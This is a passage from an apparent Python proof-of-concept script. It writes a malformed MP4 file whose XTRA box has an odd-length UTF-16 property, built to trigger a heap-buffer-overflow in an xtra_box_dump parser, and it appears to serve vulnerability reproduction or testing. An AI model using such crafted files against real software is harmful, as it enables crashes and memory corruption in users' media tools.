0 (so xtra_box_dump treats it as UTF-16)\n    - prop_size-6 must be ODD (so the appended null terminator is misaligned)\n    """\n    xtra_data = b\'\'\n    \n    # Tag name\n    tag_name = b\'WM/Title\'\n    name_size = len(tag_name)\n    \n    # Property data - use odd length (7 bytes) to trigger misalignment\n    # After subtracting 6 (for prop_type field), we get 7 bytes of actual data\n    prop_data = b\'A\' * 7  # 7 bytes - ODD length\n    prop_size = 6 + len(prop_data)  # 6 (for prop_type) + 7 = 13\n    \n    # Calculate tag_size: 8 (tag_size + name_size) + name_size + 8 (flags + prop_size) + 2 (prop_type) + len(prop_data)\n    tag_size = 8 + name_size + 8 + 2 + len(prop_data)\n    \n    # Build the tag entry\n    xtra_data += struct.pack(\'>I\', tag_size)  # tag_size\n    xtra_data += struct.pack(\'>I\', name_size)  # name_size\n    xtra_data += tag_name  # name\n    xtra_data += struct.pack(\'>I\', 0)  # flags\n    xtra_data += struct.pack(\'>I\', prop_size)  # prop_size (13)\n    xtra_data += struct.pack(\'>H\', 0)  # prop_type = 0 (string/UTF-16)\n    xtra_data += prop_data  # 7 bytes - this will cause misaligned terminator\n    \n    return write_box(\'XTRA\', xtra_data)\n\ndef create_udta_box():\n    """Create a udta (user data) box containing the XTRA box."""\n    udta_data = create_xtra_box()\n    return write_box(\'udta\', udta_data)\n\ndef create_moov_box():\n    """Create a minimal moov (movie) box containing udta."""\n    # Create a minimal mvhd (movie header) box - required in moov\n    mvhd_data = b\'\\x00\' * 4  # version + flags\n    mvhd_data += struct.pack(\'>I\', 0)  # creation_time\n    mvhd_data += struct.pack(\'>I\', 0)  # modification_time\n    mvhd_data += struct.pack(\'>I\', 1000)  # timescale\n    mvhd_data += struct.pack(\'>I\', 0)  # duration\n    mvhd_data += struct.pack(\'>I\', 0x00010000)  # rate (1.0)\n    mvhd_data += struct.pack(\'>H\', 0x0100)  # volume (1.0)\n    mvhd_data += b\'\\x00\' * 10  # reserved\n    mvhd_data += struct.pack(\'>9I\', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # matrix\n    mvhd_data += b\'\\x00\' * 24  # pre_defined\n    mvhd_data += struct.pack(\'>I\', 1)  # next_track_ID\n    mvhd_box = write_box(\'mvhd\', mvhd_data)\n    \n    # Combine mvhd and udta inside moov\n    moov_data = mvhd_box + create_udta_box()\n    return write_box(\'moov\', moov_data)\n\ndef main():\n    with open(output_path, \'wb\') as f:\n        # Write ftyp box (required for valid MP4)\n        f.write(create_ftyp_box())\n        \n        # Write moov box with udta containing XTRA box\n        f.write(create_moov_box())\n    \n    print(f"[+] Generated test case: {output_path}")\n    print(f"[+] File size: {len(open(output_path, \'rb\').read())} bytes")\n    print(f"[+] Contains XTRA box with odd prop_size to trigger heap-buffer-overflow")\n    return 0\n\nif __name__ == \'__main__\':\n    sys.exit(main())\n'}
